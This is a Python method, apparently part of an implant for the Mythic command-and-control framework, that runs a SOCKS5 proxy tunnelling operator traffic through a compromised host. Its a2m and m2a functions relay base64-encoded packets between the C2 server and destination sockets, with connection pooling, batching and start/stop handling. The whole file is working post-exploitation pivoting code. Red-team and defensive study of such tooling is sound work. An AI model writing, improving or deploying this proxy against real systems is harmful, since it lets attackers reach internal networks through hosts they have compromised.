    def Adv_socks(self, task_id, action, port):
        import socket, select, queue, asyncio
        from threading import Thread, active_count, Lock
        from struct import pack, unpack
        from collections import defaultdict
        import time
        import base64
        import threading
        import logging
        
        # Configure logging
        logging.basicConfig(level=logging.INFO, format=
            '%(asctime)s - %(levelname)s - %(message)s')
        
        # Enhanced configuration with fixed defaults
        MAX_THREADS = 300
        BUFSIZE = 16384  # Increased buffer size for better throughput
        TIMEOUT_SOCKET = 5 # Reduced socket timeout
        OUTGOING_INTERFACE = ""
        
        # Connection pool configuration
        MAX_CONNECTIONS_PER_HOST = 15 # Increased max connections per host
        CONNECTION_POOL_TIMEOUT = 180  # 3 minutes
        
        # SOCKS5 protocol constants
        VER = b'\x05'
        M_NOAUTH = b'\x00'
        M_NOTAVAILABLE = b'\xff'
        CMD_CONNECT = b'\x01'
        ATYP_IPV4 = b'\x01'
        ATYP_IPV6 = b'\x04'
        ATYP_DOMAINNAME = b'\x03'
        
        # Performance tuning
        SOCKS_SLEEP_INTERVAL = 0.001  # Reduced for faster response
        QUEUE_TIMEOUT = 0.01  # Reduced timeout for better responsiveness
        BATCH_SIZE = 20  # Process more packets at once
        
        # Connection tracking and statistics
        connection_stats = {
            'active_connections': 0,
            'total_connections': 0,
            'bytes_transferred': 0,
            'failed_connections': 0
        }
        stats_lock = Lock()
        
        # Connection pool for reusing connections
        connection_pool = defaultdict(list)
        pool_lock = Lock()
        
        def update_stats(stat_name, value=1):
            with stats_lock:
                connection_stats[stat_name] += value
        
        def get_pooled_connection(host, port):
            """Get a connection from the pool or create a new one"""
            with pool_lock:
                key = f"{host}:{port}"
                if key in connection_pool and connection_pool[key]:
                    sock = connection_pool[key].pop()
                    # Verify connection is still alive without sending data
                    try:
                        # Check if the socket is still connected and writable
                        # Using select with a very short timeout for non-blocking check
                        r, w, e = select.select([sock], [sock], [sock], 0)
                        if sock in r or sock in w:
                            return sock
                        else:
                            logging.info(f"Stale connection found in pool for {key}, closing.")
                            sock.close()
                    except Exception as ex:
                        logging.warning(f"Error checking pooled connection for {key}: {ex}, closing.")
                        try:
                            sock.close()
                        except:
                            pass
                return None
        
        def return_pooled_connection(host, port, sock):
            """Return a connection to the pool"""
            with pool_lock:
                key = f"{host}:{port}"
                if len(connection_pool[key]) < MAX_CONNECTIONS_PER_HOST:
                    sock.settimeout(CONNECTION_POOL_TIMEOUT)
                    connection_pool[key].append(sock)
                    return True
                else:
                    try:
                        sock.close()
                    except:
                        pass
                    return False
        
        def sendSocksPacket(server_id, data, exit_value, priority=False):
            """Enhanced packet sending with priority support"""
            packet = {
                "server_id": server_id,
                "data": base64.b64encode(data).decode() if data else "",
                "exit": exit_value,
                "timestamp": time.time()
            }
            
            if priority:
                # For high priority packets (like connection responses)
                try:
                    self.socks_out.put(packet, timeout=0.1)
                except queue.Full:
                    logging.warning(f"High priority queue full for server_id {server_id}")
                    pass
            else:
                self.socks_out.put(packet)
        
        def create_socket():
            """Enhanced socket creation with better error handling"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT_SOCKET)
                # Enable socket reuse
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                # Optimize for low latency
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                return sock
            except Exception as err:
                logging.error(f"Failed to create socket: {str(err)}")
                return f"Failed to create socket: {str(err)}"
        
        def connect_to_dst(dst_addr, dst_port):
            """Enhanced connection with pooling and better error handling"""
            # Try to get a pooled connection first
            sock = get_pooled_connection(dst_addr, dst_port)
            if sock:
                logging.info(f"Reusing pooled connection for {dst_addr}:{dst_port}")
                return sock
            
            sock = create_socket()
            if isinstance(sock, str):  # Error message
                update_stats('failed_connections')
                return 0
            
            if OUTGOING_INTERFACE:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
                                  OUTGOING_INTERFACE.encode())
                except PermissionError:
                    logging.error(f"Permission denied to bind to interface {OUTGOING_INTERFACE}")
                    update_stats('failed_connections')
                    return 0
            
            try:
                sock.connect((dst_addr, dst_port))
                update_stats('total_connections')
                update_stats('active_connections')
                logging.info(f"Successfully connected to {dst_addr}:{dst_port}")
                return sock
            except socket.error as e:
                logging.error(f"Socket connection error to {dst_addr}:{dst_port}: {e}")
                update_stats('failed_connections')
                try:
                    sock.close()
                except:
                    pass
                return 0
        
        def request_client(msg):
            """Enhanced SOCKS5 request parsing with IPv6 support"""
            try:
                message = base64.b64decode(msg["data"])
                s5_request = message[:BUFSIZE]
            except Exception as e:
                logging.error(f"Error decoding SOCKS5 request: {e}")
                return False
            
            if len(s5_request) < 4:
                logging.warning(f"SOCKS5 request too short: {len(s5_request)} bytes")
                return False
            
            if (s5_request[0:1] != VER or 
                s5_request[1:2] != CMD_CONNECT or 
                s5_request[2:3] != b'\x00'):
                logging.warning(f"Invalid SOCKS5 request format: {s5_request}")
                return False
            
            try:
                if s5_request[3:4] == ATYP_IPV4:
                    if len(s5_request) < 10:
                        logging.warning("IPv4 SOCKS5 request too short")
                        return False
                    dst_addr = socket.inet_ntoa(s5_request[4:8])
                    dst_port = unpack('>H', s5_request[8:10])[0]
                elif s5_request[3:4] == ATYP_IPV6:
                    if len(s5_request) < 22:
                        logging.warning("IPv6 SOCKS5 request too short")
                        return False
                    dst_addr = socket.inet_ntop(socket.AF_INET6, s5_request[4:20])
                    dst_port = unpack('>H', s5_request[20:22])[0]
                elif s5_request[3:4] == ATYP_DOMAINNAME:
                    if len(s5_request) < 5:
                        logging.warning("Domain name SOCKS5 request too short")
                        return False
                    sz_domain_name = s5_request[4]
                    if len(s5_request) < 5 + sz_domain_name + 2:
                        logging.warning("Domain name SOCKS5 request incomplete")
                        return False
                    dst_addr = s5_request[5:5 + sz_domain_name].decode('utf-8')
                    port_offset = 5 + sz_domain_name
                    dst_port = unpack('>H', s5_request[port_offset:port_offset + 2])[0]
                else:
                    logging.warning(f"Unsupported ATYP: {s5_request[3:4]}")
                    return False
                
                return (dst_addr, dst_port)
            except Exception as e:
                logging.error(f"Error parsing SOCKS5 request address/port: {e}")
                return False
        
        def create_connection(msg):
            """Enhanced connection creation with better error handling"""
            dst = request_client(msg)
            rep = b'\x07'  # General SOCKS server failure
            bnd = b'\x00' * 6  # Default binding
            socket_dst = None
            
            if dst:
                socket_dst = connect_to_dst(dst[0], dst[1])
            
            if not dst or socket_dst == 0:
                rep = b'\x01'  # General SOCKS server failure
                logging.error(f"Failed to establish connection for {msg.get('server_id')}")
            else:
                rep = b'\x00'  # Success
                try:
                    # Get the actual bound address and port
                    bound_addr, bound_port = socket_dst.getsockname()
                    bnd = socket.inet_aton(bound_addr) + pack(">H", bound_port)
                    logging.info(f"Connection established and bound to {bound_addr}:{bound_port}")
                except Exception as e:
                    logging.warning(f"Could not get bound address/port: {e}")
                    bnd = b'\x00' * 6
            
            # Build SOCKS5 response
            reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
            
            try:
                sendSocksPacket(msg["server_id"], reply, msg["exit"], priority=True)
            except Exception as e:
                logging.error(f"Error sending SOCKS5 reply for {msg.get('server_id')}: {e}")
                if socket_dst and socket_dst != 0:
                    try:
                        socket_dst.close()
                    except:
                        pass
                return None
            
            if rep == b'\x00':
                return socket_dst
            return None
        
        def get_running_socks_thread():
            """Get currently running SOCKS threads"""
            return [t for t in threading.enumerate() 
                   if "socks:" in t.name and task_id not in t.name]
        
        def a2m(server_id, socket_dst):
            """Agent to Mythic - Enhanced with batching and better error handling"""
            buffer = b""
            last_activity = time.time()
            
            while True:
                # Check if task is still active
                if task_id not in [task["task_id"] for task in self.taskings]:
                    logging.info(f"Task {task_id} no longer active, stopping a2m for {server_id}")
                    break
                elif [task for task in self.taskings 
                      if task["task_id"] == task_id][0]["stopped"]:
                    logging.info(f"Task {task_id} stopped, stopping a2m for {server_id}")
                    break
                
                if server_id not in self.socks_open.keys():
                    logging.info(f"Server ID {server_id} not in socks_open, stopping a2m.")
                    break
                
                try:
                    # Use select with shorter timeout for better responsiveness
                    reader, _, error = select.select([socket_dst], [], [socket_dst], 0.005)
                    
                    if error:
                        logging.error(f"Socket error in a2m for {server_id}")
                        break
                    
                    if reader:
                        try:
                            data = socket_dst.recv(BUFSIZE)
                            if not data:
                                logging.info(f"Socket closed by remote for {server_id}")
                                sendSocksPacket(server_id, b"", True)
                                break
                            
                            # Batch small packets for efficiency
                            buffer += data
                            last_activity = time.time()
                            
                            # Send immediately if buffer is large or hasn't been sent recently
                            if len(buffer) >= BUFSIZE // 4 or time.time() - last_activity > 0.02:
                                sendSocksPacket(server_id, buffer, False)
                                update_stats('bytes_transferred', len(buffer))
                                buffer = b""
                        
                        except socket.error as e:
                            logging.error(f"Socket recv error in a2m for {server_id}: {e}")
                            break
                    
                    # Send any remaining buffered data periodically
                    elif buffer and time.time() - last_activity > 0.05:
                        sendSocksPacket(server_id, buffer, False)
                        update_stats('bytes_transferred', len(buffer))
                        buffer = b""
                
                except Exception as e:
                    logging.error(f"Unexpected error in a2m for {server_id}: {e}")
                    break
                
                time.sleep(SOCKS_SLEEP_INTERVAL)
            
            # Send any remaining buffer data
            if buffer:
                sendSocksPacket(server_id, buffer, False)
            
            # Cleanup
            try:
                socket_dst.close()
                logging.info(f"Closed socket for {server_id} in a2m.")
            except Exception as e:
                logging.error(f"Error closing socket in a2m for {server_id}: {e}")
            update_stats('active_connections', -1)
        
        def m2a(server_id, socket_dst):
            """Mythic to Agent - Enhanced with batching"""
            while True:
                # Check if task is still active
                if task_id not in [task["task_id"] for task in self.taskings]:
                    logging.info(f"Task {task_id} no longer active, stopping m2a for {server_id}")
                    break
                elif [task for task in self.taskings 
                      if task["task_id"] == task_id][0]["stopped"]:
                    logging.info(f"Task {task_id} stopped, stopping m2a for {server_id}")
                    break
                
                if server_id not in self.socks_open.keys():
                    logging.info(f"Server ID {server_id} not in socks_open, stopping m2a.")
                    break
                
                try:
                    # Process multiple packets at once for better performance
                    packets_processed = 0
                    while (not self.socks_open[server_id].empty() and 
                           packets_processed < BATCH_SIZE):
                        try:
                            data = self.socks_open[server_id].get(timeout=QUEUE_TIMEOUT)
                            decoded_data = base64.b64decode(data)
                            socket_dst.send(decoded_data)
                            update_stats('bytes_transferred', len(decoded_data))
                            packets_processed += 1
                        except queue.Empty:
                            break
                        except Exception as e:
                            logging.error(f"Error processing packet in m2a for {server_id}: {e}")
                            return
                    
                except Exception as e:
                    logging.error(f"Unexpected error in m2a for {server_id}: {e}")
                    break
                
                time.sleep(SOCKS_SLEEP_INTERVAL)
            
            # Cleanup
            try:
                socket_dst.close()
                logging.info(f"Closed socket for {server_id} in m2a.")
            except Exception as e:
                logging.error(f"Error closing socket in m2a for {server_id}: {e}")
        
        def cleanup_stale_connections():
            """Clean up stale connections in the pool"""
            with pool_lock:
                current_time = time.time()
                for host_port, connections in list(connection_pool.items()):
                    valid_connections = []
                    for conn in connections:
                        try:
                            # Test if connection is still alive without sending data
                            r, w, e = select.select([conn], [conn], [conn], 0)
                            if conn in r or conn in w:
                                valid_connections.append(conn)
                            else:
                                logging.info(f"Stale connection found during cleanup for {host_port}, closing.")
                                conn.close()
                        except Exception as ex:
                            logging.warning(f"Error checking connection during cleanup for {host_port}: {ex}, closing.")
                            try:
                                conn.close()
                            except:
                                pass
                    connection_pool[host_port] = valid_connections
        
        # Get currently running SOCKS threads
        t_socks = get_running_socks_thread()
        
        if action == "start":
            if len(t_socks) > 0:
                return "[!] SOCKS Proxy already running."
            
            self.sendTaskOutputUpdate(task_id, 
                f"[*] Enhanced SOCKS5 Proxy started on port {port}.\n"
                f"[*] Max connections: {MAX_THREADS}, Buffer size: {BUFSIZE}\n"
                f"[*] Connection pooling enabled (max {MAX_CONNECTIONS_PER_HOST} per host)\n")
            
            # Start connection cleanup thread
            cleanup_thread = Thread(target=lambda: [
                cleanup_stale_connections() or time.sleep(30) 
                for _ in iter(int, 1)
            ], daemon=True, name=f"cleanup:{task_id}")
            cleanup_thread.start()
            
            packet_batch = []
            last_batch_time = time.time()
            
            while True:
                # Check if task should stop
                if [task for task in self.taskings 
                    if task["task_id"] == task_id][0]["stopped"]:
                    
                    # Print final statistics
                    with stats_lock:
                        stats_msg = (
                            f"[*] SOCKS Proxy Statistics:\n"
                            f"    Active connections: {connection_stats['active_connections']}\n"
                            f"    Total connections: {connection_stats['total_connections']}\n"
                            f"    Bytes transferred: {connection_stats['bytes_transferred']}\n"
                            f"    Failed connections: {connection_stats['failed_connections']}\n"
                        )
                    self.sendTaskOutputUpdate(task_id, stats_msg)
                    return "[*] Enhanced SOCKS Proxy stopped."
                
                # Process incoming packets in batches
                try:
                    while not self.socks_in.empty() and len(packet_batch) < BATCH_SIZE:
                        packet_json = self.socks_in.get(timeout=QUEUE_TIMEOUT)
                        if packet_json:
                            packet_batch.append(packet_json)
                    
                    # Process batch or timeout
                    if packet_batch and (len(packet_batch) >= BATCH_SIZE or 
                                       time.time() - last_batch_time > 0.05):
                        
                        for packet_json in packet_batch:
                            server_id = packet_json["server_id"]
                            
                            if server_id in self.socks_open.keys():
                                # Existing connection
                                if packet_json["data"]:
                                    self.socks_open[server_id].put(packet_json["data"])
                                elif packet_json["exit"]:
                                    self.socks_open.pop(server_id)
                                    logging.info(f"Removed server_id {server_id} from socks_open due to exit signal.")
                            else:
                                # New connection
                                if not packet_json["exit"]:
                                    if active_count() > MAX_THREADS:
                                        time.sleep(0.1)
                                        logging.warning(f"Max threads {MAX_THREADS} reached, delaying new connection.")
                                        continue
                                    
                                    self.socks_open[server_id] = queue.Queue()
                                    sock = create_connection(packet_json)
                                    
                                    if sock:
                                        send_thread = Thread(
                                            target=a2m, 
                                            args=(server_id, sock),
                                            name=f"a2m:{server_id}",
                                            daemon=True
                                        )
                                        recv_thread = Thread(
                                            target=m2a, 
                                            args=(server_id, sock),
                                            name=f"m2a:{server_id}",
                                            daemon=True
                                        )
                                        send_thread.start()
                                        recv_thread.start()
                                        logging.info(f"Started new a2m/m2a threads for server_id {server_id}")
                                    else:
                                        logging.error(f"Failed to create socket for new connection {server_id}")
                        
                        packet_batch = []
                        last_batch_time = time.time()
                
                except queue.Empty:
                    pass
                except Exception as e:
                    self.sendTaskOutputUpdate(task_id, f"[!] Error processing packets: {str(e)}\n")
                    logging.critical(f"Main loop error processing packets: {e}")
                
                time.sleep(SOCKS_SLEEP_INTERVAL)
        
        else:  # stop action
            if len(t_socks) > 0:
                for t_sock in t_socks:
                    try:
                        task_id_from_name = t_sock.name.split(":")[1]
                        task = [task for task in self.taskings 
                               if task["task_id"] == task_id_from_name][0]
                        task["stopped"] = task["completed"] = True
                        logging.info(f"Signaled task {task_id_from_name} to stop.")
                    except Exception as e:
                        logging.error(f"Error signaling thread to stop: {e}")
                        pass
                
                # Clean up connection pool
                with pool_lock:
                    for connections in connection_pool.values():
                        for conn in connections:
                            try:
                                conn.close()
                            except:
                                pass
                    connection_pool.clear()
                    logging.info("Connection pool cleared.")
                
                self.socks_open = {}
                logging.info("socks_open dictionary cleared.")
                return "[*] Enhanced SOCKS Proxy stopped and cleaned up."
            else:
                return "[!] No SOCKS Proxy running to stop."